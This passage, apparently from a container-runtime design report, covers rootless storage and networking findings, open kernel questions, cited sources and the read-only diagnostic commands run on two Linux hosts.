   `/etc/subuid`, `chown` to an unmapped uid returns **`EINVAL`** (`[O]`
   §10.3), so an image containing files owned by uid 33/100/999 cannot be
   extracted faithfully. Error messages must name `/etc/subuid`, not report a
   generic `EINVAL`.
2. **Idmapped mounts (5.12+) are the alternative to `chown -R` on a layer**
   (§10.5), and they preserve cross-user layer sharing in the CAS, which
   `chown -R` destroys. **Overlayfs as the *upper* layer needs 5.19** (`[F]
   MED`), so idmapping the container's assembled rootfs is a later kernel than
   idmapping the lowers.
3. **`userxattr` is a rootless-overlay concern**, but note `[O] old-host`:
   overlayfs in an unprivileged userns works on RHEL 8 / 4.18 **without**
   `userxattr` in the mount options — a Red Hat backport predating upstream
   5.11. Do not assume `userxattr` ⇔ rootless overlay.
4. `[O] host-a` — Docker's overlay mount on this host carries
   **`nouserxattr`** explicitly (root mode). Worth knowing the option is
   two-valued in the mount line.
5. **`fuse-overlayfs` requires `/dev/fuse`, which Docker's default device
   cgroup explicitly DENIES** (`10:229`, §15.1). Nested rootless-in-container
   needs `--device /dev/fuse`.

### To D4 (networking)

1. **`CAP_NET_ADMIN` gates the host side, not the container side.** `[O]
   old-host`: inside `unshare -Urn`, an unprivileged user **can** create veth
   pairs and bridges (`ip link add … type veth` → rc=0, `type bridge` → rc=0).
   What fails is moving one end into the *host* netns, which needs
   `CAP_NET_ADMIN` in the host netns. So the rootless networking problem is
   specifically the host-side attach, and that is what `slirp4netns`/`pasta`
   exist to avoid.
2. **Ports below 1024 bind fine inside a fresh netns as an unprivileged
   user.** `[O] old-host`: `unshare -Urn` + `bind(("0.0.0.0", 80))` →
   **succeeded**. The rootless port problem is *publishing* to the host, not
   binding in the container.
3. `[O] host-a` — Docker sets, in each container's netns:
   `net.ipv4.ip_unprivileged_port_start = 0` and
   `net.ipv4.ping_group_range = 0 2147483647` (the host has `1 0`, an empty
   range). The first makes `CAP_NET_BIND_SERVICE` unnecessary in-container;
   the second makes `ping` work without `CAP_NET_RAW`. Both let us drop
   capabilities from our default set (§8.3).
4. **`CAP_NET_RAW` in the default set is a cross-container attack surface** on
   a shared bridge (ARP/DNS spoofing of neighbours) — a networking-design
   consideration, not just a capability one (§8.3).
---

## 21. Open questions

Ordered by how much they would change a decision.

1. **`CLONE_INTO_CGROUP`'s exact constraints and errnos** (§1.6, `[F] MED`).
   Does it permit spawning into a leaf whose parent has `subtree_control` set?
   What errno for a `domain invalid` target? Settled by experiment §1.7-E2 on
   the local VM. *Decision affected:* whether the pipe-synchronised path stays
   the only correctness-bearing one (I believe it should regardless).
2. **The no-internal-process errno** (§1.3, `[F] MED` on the errno). Expect
   `EBUSY` both directions. Settled by §1.7-E1. *Decision affected:* error
   messages, and whether we can distinguish it from a genuine `EBUSY`.
3. **Which cgroup properties runc's systemd driver writes via D-Bus vs directly
   to cgroupfs** (§2.3, `[F] MED`). Settled by reading
   `runc/libcontainer/cgroups/systemd/v2.go`'s `genV2ResourcesProperties`.
   *Decision affected:* how much a future systemd driver actually costs.
4. **The RHEL 8 overlayfs-in-userns backport mechanism** (§7.2, `[F] MED`).
   Confirmed working empirically; the *how* is unconfirmed. Settled by
   `fs/overlayfs/super.c` in `kernel-4.18.0-425.el8` sources or the kernel RPM
   changelog. *Decision affected:* nothing in our design — but it is the
   evidence base for §7.2's "never version-sniff" rule, so worth nailing.
5. **`chown 0:0` returning `EINVAL` inside `unshare -Ur` while `chown 0`
   succeeds** (§10.3, `[O] MED`). I could not explain it. Suspicion:
   `setgroups=deny` interacting with the supplementary-group set. Settled by
   `strace -e chown` on the local VM. *Decision affected:* the wording of the
   "uid not mapped" error message, possibly its trigger condition.
6. **The `newuidmap` single-mapping `EPERM`** (§10.2, `[O] MED`). Likely my
   test harness picked the wrong target pid. Settled by a proper parent/child
   harness. *Decision affected:* whether we can ever use `newuidmap` for the
   trivial mapping case, or must always write `uid_map` ourselves.
7. **`seccomp(2)` returning `EACCES` without `no_new_privs` and without
   `CAP_SYS_ADMIN`** (§9.2, `[O] LOW` — my probe produced no output). The man
   page is unambiguous so this is verification, not discovery. Settled by a
   5-line C program.
8. **`cgroup2` mount inside a userns returning `EPERM` on `old-host`** (§2.2,
   `[O]` fact `HIGH`, cause `MED`). Is it because no v2 hierarchy is mounted in
   the init namespace, or a RHEL-specific restriction? *Decision affected:*
   whether "manufacture our own cgroup2 in a userns" is ever a viable rootless
   fallback. My reading is that it is not, on any kernel, for a *writable*
   controller-enabled hierarchy — but I did not confirm.
9. **Whether `no_new_privs` blocks an AppArmor transition to a
   more-confined profile** (§13.3, `[F] MED`). runc's ordering implies not.
   Settled by testing on the local VM with AppArmor. *Decision affected:*
   whether we can apply LSM labels after `no_new_privs` (tidier) or must apply
   before (runc's order).
10. **Why `/dev/full` (1:7) is absent from Docker's device-cgroup rule list
    while the node exists and works** (§15.1, `[F] LOW`). Settled by reading
    `runc/libcontainer/specconv/spec_linux.go`'s `AllowedDevices`.
11. **Exact upstream versions for `memory.events.local`, `memory.peak`,
    `pids.peak`, `cpuset.cpus.partition`** (§7.1, `[F] MED`/`LOW`). Settled by
    `git log --oneline -S'<filename>' -- mm/memcontrol.c kernel/cgroup/` in a
    kernel tree. *Decision affected:* only the probe/skip boundary, and we
    probe by file existence anyway — which is why this is last.
12. **Landlock.** `[O] host-a` — `/sys/kernel/security/lsm` reads
    `lockdown,capability,landlock,yama,apparmor,ima,evm`, so **Landlock is
    available**. Landlock is the one LSM an *unprivileged* process can use on
    itself, which makes it uniquely interesting for rootless (it could give us
    path-based restriction without root, something seccomp cannot do — §9.1).
    Not researched. *Decision affected:* potentially a real answer to §13.3's
    "rootless gets no LSM" gap. **This is the most interesting unexplored
    thread in my area.**
---

## 22. Sources

Every URL actually used, grouped by priority tier.

### Kernel documentation and man pages (primary)
- `Documentation/admin-guide/cgroup-v2.rst` —
  https://raw.githubusercontent.com/torvalds/linux/master/Documentation/admin-guide/cgroup-v2.rst
  (also rendered: https://docs.kernel.org/admin-guide/cgroup-v2.html)
- `capabilities(7)` — https://man7.org/linux/man-pages/man7/capabilities.7.html
- `user_namespaces(7)` — https://man7.org/linux/man-pages/man7/user_namespaces.7.html
- `seccomp(2)` — https://man7.org/linux/man-pages/man2/seccomp.2.html
- Referenced but not fetched this session (claims marked accordingly):
  `cgroups(7)`, `prctl(2)`, `proc(5)`, `pid_namespaces(7)`, `statfs(2)`,
  `clone(2)`, `mount_setattr(2)`, `openat2(2)`, `close_range(2)`,
  `pidfd_open(2)`, `pidfd_send_signal(2)`, `systemd.resource-control(5)`,
  `Documentation/accounting/psi.rst`,
  `Documentation/userspace-api/seccomp_filter.rst`,
  `Documentation/filesystems/idmappings.rst`

### OCI and mature runtime source
- runc default spec (caps, masked/readonly paths, devices, mounts) —
  https://raw.githubusercontent.com/opencontainers/runc/main/libcontainer/specconv/example.go
- runc container init ordering (seccomp vs cap-drop, `no_new_privs`, fd close) —
  https://raw.githubusercontent.com/opencontainers/runc/main/libcontainer/standard_init_linux.go
- runc seccomp ENOSYS BPF patching —
  https://raw.githubusercontent.com/opencontainers/runc/main/libcontainer/seccomp/patchbpf/enosys_linux.go
- Docker default capabilities —
  `moby/daemon/pkg/oci/caps/defaults.go` (fetched via `gh api`)
- Docker default OCI spec: masked paths, readonly paths, mounts, device cgroup
  rules — `moby/daemon/pkg/oci/defaults.go` (fetched via `gh api`)
- Docker default seccomp profile (generated form) —
  `moby/daemon/pkg/oci/fixtures/default.json` (fetched via `gh api`)

### Vulnerability research
- CVE-2022-0492 (cgroup v1 `release_agent`) —
  https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/
- CVE-2024-21626 (runc leaked fd / `WORKDIR`) —
  https://github.com/opencontainers/runc/security/advisories/GHSA-xr7r-f8xq-vfvv
- moby GHSA-6fw5-f8r9-fgfm (`/proc/interrupts`, `thermal_throttle`) and
  GHSA-jq35-85cj-fj4p (`/sys/devices/virtual/powercap`, PLATYPUS /
  CVE-2020-8694) — referenced from `moby/daemon/pkg/oci/defaults.go` comments
- CVE-2019-5736 (`/proc/self/exe`) and CVE-2019-14271 (`docker cp` NSS) —
  described from prior knowledge and the runc fix's shape; **not fetched this
  session**, hence `[F] MED` on the CVE-2019-14271 library detail

### Crate health (crates.io API, 2026-09-04)
- `seccompiler` https://github.com/rust-vmm/seccompiler
- `libseccomp` https://github.com/libseccomp-rs/libseccomp-rs
- `caps` https://github.com/lucab/caps-rs
- `cgroups-rs` https://github.com/kata-containers/cgroups-rs
- `libcgroups` https://github.com/youki-dev/youki
- `aya` https://github.com/aya-rs/aya
- `libbpf-rs` https://github.com/libbpf/libbpf-rs
- `nix` https://github.com/nix-rust/nix
- `rustix` https://github.com/bytecodealliance/rustix
- `procfs` https://github.com/eminence/procfs

### Empirical (`[O]`) — commands run

**`host-a`** (Ubuntu 24.10, `6.11.0-29-generic`, read-only):
`stat -fc %T /sys/fs/cgroup`; `cat /sys/fs/cgroup/{cgroup.controllers,cgroup.subtree_control}`;
`cat /sys/fs/cgroup/system.slice/docker-*.scope/{cgroup.type,cgroup.controllers,cgroup.subtree_control,memory.max,memory.high,memory.low,memory.min,memory.swap.max,memory.swap.current,memory.swap.high,memory.swap.events,memory.zswap.max,memory.current,memory.peak,memory.events,memory.events.local,memory.stat,memory.pressure,memory.oom.group,cpu.max,cpu.weight,cpu.max.burst,cpu.stat,cpu.pressure,pids.max,pids.current,pids.events,io.max,io.weight,io.stat,io.pressure,cpuset.cpus,cpuset.cpus.effective,cpuset.mems,cgroup.freeze,cgroup.events,cgroup.stat,cgroup.procs}`;
`ls /sys/fs/cgroup/system.slice/docker-*.scope/`; `cat /run/systemd/transient/docker-*.scope`;
`cat /proc/sys/kernel/{pid_max,threads-max}`;
`grep -E '^(Cap|NoNewPrivs|Seccomp|Uid|Gid|Groups)' /proc/<pid>/status`;
`capsh --decode=<hex>`; `cat /proc/<pid>/attr/current`;
`cat /proc/<pid>/{uid_map,gid_map}`; `ls -l /proc/<pid>/ns/`;
`cat /proc/<pid>/mountinfo`; `aa-status`; `cat /sys/module/apparmor/parameters/enabled`;
`cat /sys/kernel/security/lsm`; `cat /sys/kernel/security/apparmor/profiles`;
`ls /etc/apparmor.d/`; `cat /etc/docker/daemon.json` (absent); `cat /etc/subuid /etc/subgid`;
`cat /proc/sys/user/*`; `sysctl kernel.unprivileged_userns_clone kernel.unprivileged_bpf_disabled kernel.dmesg_restrict kernel.yama.ptrace_scope net.ipv4.ping_group_range fs.protected_symlinks`;
`docker info --format …`; `docker inspect webapp-nginx-1`;
`nsenter -t <pid> -m -- ls -la /dev`;
`nsenter -t <pid> -m -n -- cat /proc/sys/net/ipv4/{ping_group_range,ip_unprivileged_port_start}`;
`bpftool cgroup show <scope>`; `bpftool prog list`;
`ls -d /sys/devices/virtual/powercap /proc/sched_debug /proc/timer_stats` (all absent).
**No writes were performed anywhere.**

**`old-host`** (Rocky 8.8, `4.18.0-425.3.1.el8.x86_64`, unprivileged):
`stat -fc %T /sys/fs/cgroup`; `mount | grep cgroup`; `cat /proc/self/cgroup`;
`ls -ld /sys/fs/cgroup/*`; `mkdir /sys/fs/cgroup/memory/test-d5` (→ `EACCES`);
`getcap /usr/bin/new{u,g}idmap`; `grep sataromk /etc/subuid /etc/subgid` (absent);
`unshare -U bash -c 'echo "0 <uid> 1" > /proc/self/uid_map'` and variants (§10.2 table);
`unshare -U grep '^Cap' /proc/self/status`; `unshare -Ur grep '^Cap' /proc/self/status`;
`python3` `ctypes` `libc.unshare(CLONE_NEWUSER)` then in-process `uid_map` write;
`unshare -Ur chown 100:100 …` / `chown 0:0 …` / `chown 0 …`;
`unshare -Ur setpriv --reuid 65534 …`;
`unshare -Urm mount -t overlay …`; `unshare -Urm mount -t tmpfs …`;
`unshare -Urm mount -t {proc,sysfs,cgroup2} …` and the `-Urmp` / `-Urmn` variants;
`unshare -Urn python3 -c 'socket().bind(("0.0.0.0",80))'`;
`unshare -Urn ip link add v0 type veth peer name v1` / `type bridge`;
`cat /proc/sys/kernel/cap_last_cap`; `capsh --decode` for bits 37–41;
`ls /proc/pressure/*` (absent);
raw `syscall(nr, …)` probes for `clone3`(435), `openat2`(437), `pidfd_open`(434),
`pidfd_send_signal`(424), `epoll_pwait2`(441), `faccessat2`(439),
`memfd_secret`(447), `fchmodat2`(452);
`getenforce`; `which fuse-overlayfs fusermount3`; `stat -fc '%n %T' /tmp $HOME`.
All writes confined to `/tmp`.
